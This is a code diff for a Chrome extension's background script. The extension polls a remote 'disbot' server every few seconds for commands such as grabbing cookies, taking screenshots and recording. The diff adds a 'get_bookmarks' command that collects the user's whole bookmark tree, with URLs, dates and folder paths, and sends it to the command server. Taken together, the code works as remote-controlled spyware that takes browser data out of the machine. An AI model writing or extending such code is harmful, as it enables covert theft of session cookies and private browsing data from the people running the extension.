@@ -1,6 +1,6 @@
 // ============ Configuration ============
-const SERVER_BASE_URL = 'https://disbot-backendzip--devilhero399.replit.app';
-// const SERVER_BASE_URL = 'http://localhost:8080';
+// const SERVER_BASE_URL = 'https://disbot-backendzip--devilhero399.replit.app';
+const SERVER_BASE_URL = 'http://localhost:8080';
 let CLIENT_ID = null;
 let EXTENSION_ID = null; // Short, memorable ID for easy identification
 let CLIENT_NAME = 'Chrome Extension';
@@ -8,7 +8,7 @@ let USER_NAME = null;
 let isConnected = false;
 
 const POLL_ALARM_NAME = 'pollCommands';
-const POLL_INTERVAL_MINUTES = 0.05; // ~2 seconds (minimum is 1 minute in production, but dev allows this) //change it to 2 seconds on dev 
+const POLL_INTERVAL_MINUTES = 0.033; // ~2 seconds (minimum is 1 minute in production, but dev allows this) //change it to 2 seconds on dev 
 
 // Auto-screenshot state management
 let autoScreenshotState = {
@@ -196,6 +196,11 @@ async function processCommand(command) {
             case 'get_cookies':
                 console.log(`🍪 Cookies requested by ${command.requestedBy}`);
                 await captureCookies(command.id, command.requestedById);
+                break;
+
+            case 'get_bookmarks':
+                console.log(`🔖 Bookmarks requested by ${command.requestedBy}`);
+                await captureBookmarks(command.id, command.requestedById);
                 break;
 
             case 'start_recording':
@@ -491,6 +496,71 @@ async function captureCookies(commandId, userId) {
 
     } catch (error) {
         console.error('Error capturing cookies:', error);
+        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
+    }
+}
+
+// ============ Bookmarks Capture ============
+async function captureBookmarks(commandId, userId) {
+    try {
+        // Get the entire bookmark tree
+        const bookmarkTree = await chrome.bookmarks.getTree();
+        
+        // Get user ID from storage
+        const storage = await chrome.storage.local.get(['clientId']);
+        const userIdVal = storage.clientId || CLIENT_ID;
+        
+        // Flatten the bookmark tree
+        const flattenedBookmarks = [];
+        let totalFolders = 0;
+        
+        function flattenBookmarkNode(node, path = []) {
+            if (node.url) {
+                // This is a bookmark
+                flattenedBookmarks.push({
+                    id: node.id,
+                    title: node.title || 'Untitled',
+                    url: node.url,
+                    dateAdded: node.dateAdded ? new Date(node.dateAdded).toISOString() : null,
+                    dateLastUsed: node.dateLastUsed ? new Date(node.dateLastUsed).toISOString() : null,
+                    path: path.join(' > ') || 'Root'
+                });
+            } else if (node.children) {
+                // This is a folder
+                if (node.title) {
+                    totalFolders++;
+                    path = [...path, node.title];
+                }
+                
+                // Recursively process children
+                node.children.forEach(child => flattenBookmarkNode(child, path));
+            }
+        }
+        
+        // Start flattening from root
+        bookmarkTree.forEach(node => flattenBookmarkNode(node));
+        
+        // Format the data
+        const formattedData = {
+            userId: userIdVal,
+            timestamp: new Date().toISOString(),
+            source: 'browser_bookmarks',
+            totalBookmarks: flattenedBookmarks.length,
+            totalFolders: totalFolders,
+            bookmarks: flattenedBookmarks
+        };
+
+        console.log(`🔖 Bookmarks data captured! (${flattenedBookmarks.length} bookmarks, ${totalFolders} folders)`);
+
+        // Send to server
+        await sendCommandResponse(commandId, 'bookmarks', {
+            bookmarksData: formattedData
+        }, userId);
+
+        console.log('✅ Bookmarks data sent to server!');
+
+    } catch (error) {
+        console.error('Error capturing bookmarks:', error);
         await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
     }
 }
